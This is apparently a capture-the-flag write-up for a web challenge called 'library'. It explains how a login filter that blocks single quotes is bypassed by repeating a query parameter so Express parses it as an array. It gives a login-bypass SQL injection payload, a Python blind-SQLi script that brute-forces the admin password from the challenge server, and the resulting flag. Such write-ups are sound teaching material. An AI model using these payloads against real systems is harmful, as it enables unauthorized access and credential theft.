## library

Category: Web  
Difficulty: easy-medium  

<img src="images/chall.png" width=600>

The backend initialises a user database, and initialises an admin account with the flag as the password.  

```typescript
export function getDB() {
	const db = new Database(":memory:");
	db.run(`
CREATE TABLE users (
	name string UNIQUE NOT NULL,
	password string NOT NULL
);
`);
	db.run(`INSERT INTO users VALUES ('admin', '${getEnv("FLAG")}')`);
	return db;
}
```

We can immediately notice an SQLi vulnerability in the login endpoint, however, `'` is blacklisted.  

```js
app.get("/actions/login", (req, res) => {
	const db = getDB();

	const query: QueryParams = req.query;
	console.log("query", query);

	if (!query || !query.name || !query.password) {
		return res.status(400).send("bad parameters");
	}
	if (query.name.includes("'") || query.password.includes("'")) {
		return res.status(400).send("haha nice try");
	}

	const sql = `SELECT name FROM users WHERE name = '${query.name}' AND password = '${query.password}'`;
	console.log("sql", sql);

	const user = db.query(sql).get() as { name: string } | null;

	if (!user || !user.name) return res.status(400).send(`Staff not found`);
	return res.send(`Welcome, ${user.name}. You now have access to the restricted archives.`);
});
```

To bypass the `.includes("'")` check, we can simply pass the query parameter as an array. Express allows passing parameters as arrays by repeating the same key.  

We can use the payload below to get SQLi and bypass the login.  

```
/actions/login?name=admin&password=' or 1--&password=x
```

To get the flag, we just have to bruteforce the admin password using blind SQLi.  

```python
import requests
from urllib.parse import quote
import string

url = "http://35.221.67.248:10501/"

charset = string.digits + string.ascii_lowercase + "{}_"

flag = "TSGCTF{"

while not flag.endswith("}"):
    for char in charset:
        print("Trying:", char, '|', flag)

        payload = quote(f"' or password like '{flag}{char}%'--")
        res = requests.get(f"{url}/actions/login?name=admin&password={payload}&password=x")

        if "welcome" in res.text.lower():
            flag += char
            break

print("Flag:", flag)
```

Flag: `TSGCTF{s4m3_m3th0d_n4m3_d1ff3r3nt_cl4ss_b3h4v10r}`